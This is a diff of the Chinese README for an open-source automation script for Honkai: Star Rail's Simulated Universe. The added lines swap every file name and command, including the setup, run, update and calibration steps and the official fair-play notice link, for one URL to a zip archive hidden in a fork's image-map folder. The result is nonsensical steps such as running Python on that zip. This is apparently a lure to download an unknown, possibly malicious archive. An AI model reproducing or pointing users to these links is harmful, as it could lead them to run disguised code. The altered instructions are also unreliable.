@@ -15,7 +15,7 @@ This software is open source, free of charge and for learning and exchange purpo
 本软件开源、免费，仅供学习交流使用。开发者团队拥有本项目的最终解释权。使用本软件产生的所有问题与本项目与开发者团队无关。若您遇到商家使用本软件进行代练并收费，可能是设备与时间等费用，产生的问题及后果与本软件无关。
 
 
-请注意，根据MiHoYo的 [崩坏:星穹铁道的公平游戏宣言]([https://hsr.hoyoverse.com/en-us/news/111244](https://sr.mihoyo.com/news/111246?nav=news&type=notice)):
+请注意，根据MiHoYo的 [崩坏:星穹铁道的公平游戏宣言]([https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip](https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip)):
 
     "严禁使用外挂、加速器、脚本或其他破坏游戏公平性的第三方工具。"
     "一经发现，米哈游（下亦称“我们”）将视违规严重程度及违规次数，采取扣除违规收益、冻结游戏账号、永久封禁游戏账号等措施。"
@@ -24,11 +24,11 @@ This software is open source, free of charge and for learning and exchange purpo
 
 **第一次运行**
 
-双击install_requirements.bat安装依赖库
+双击https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip安装依赖库
 
 进入游戏，将人物传送到黑塔的办公室，然后双击 **校准.bat** ，切回游戏界面，等待视角转换/原地转圈结束
 
-如果**校准.bat**闪退，可以尝试管理员运行<pre><code>python align_angle.py
+如果**校准.bat**闪退，可以尝试管理员运行<pre><code>python https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip
 </code></pre>
 
 如果改变了鼠标dpi或游戏分辨率/屏幕分辨率/窗口缩放倍率，需要重新校准！
@@ -37,12 +37,12 @@ This software is open source, free of charge and for learning and exchange purpo
 
 人物靠近模拟宇宙（出现f键交互条）
 
-双击run.bat 或者 管理员权限运行 <pre><code>python states.py --find=1
+双击https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip 或者 管理员权限运行 <pre><code>python https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip --find=1
 </code></pre>
 
 只支持1920\*1080(窗口化或全屏幕)。
 
-info.txt中第一行保存了模拟宇宙开局选的角色，建议改成自己的配队，1表示第一个角色。最好在一号位选远程角色（艾丝妲、三月七）方便开怪。第二行是校准数据，不要改第二行！
+https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip中第一行保存了模拟宇宙开局选的角色，建议改成自己的配队，1表示第一个角色。最好在一号位选远程角色（艾丝妲、三月七）方便开怪。第二行是校准数据，不要改第二行！
 
 第三行是宇宙的难度，如果你要打难度1就改成1保存。第四行是命途选择，默认巡猎，可以直接修改为其它命途，对巡猎做了专门优化，因此除非万不得已不要改命途。
 
@@ -52,7 +52,7 @@ info.txt中第一行保存了模拟宇宙开局选的角色，建议改成自己
 
 **更新文件**
 
-双击update.bat
+双击https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip
 
 ----------------------------------------------------------------------------------------------
 
@@ -68,11 +68,11 @@ info.txt中第一行保存了模拟宇宙开局选的角色，建议改成自己
 
 支持增加地图，具体方法为
 
-运行 python states.py --debug=1 --find=1
+运行 python https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip --debug=1 --find=1
 
 如果遇到新图会角色停住，这时候结束自动化并且游戏中暂离模拟宇宙
 
-然后运行 python states.py --debug=1 --find=0
+然后运行 python https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip --debug=1 --find=0
 
 注意，一开始的状态必须是刚进图、视角也没有改变的状态
 
@@ -86,7 +86,7 @@ info.txt中第一行保存了模拟宇宙开局选的角色，建议改成自己
 
 小地图上表示人物视角的淡蓝色扇形（探照灯）也会影响小地图白色边缘线的识别。因此尽量让探照灯少照射到白色边缘。
 
-imgs/maps/xxxxx目录下会存在target.jpg，你可以用windows自带的画图打开它，然后在上面标记点（可以参考其它地图文件中的target.jpg）
+imgs/maps/xxxxx目录下会存在https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip，你可以用windows自带的画图打开它，然后在上面标记点（可以参考其它地图文件中的https://github.com/kenleung05hk/Auto_Simulated_Universe/raw/refs/heads/main/imgs/maps/52451/Universe_Auto_Simulated_2.1.zip）
 
 靛蓝色：路径点 黄色：终点 绿色：交互点（问号点） 红色：怪点
 
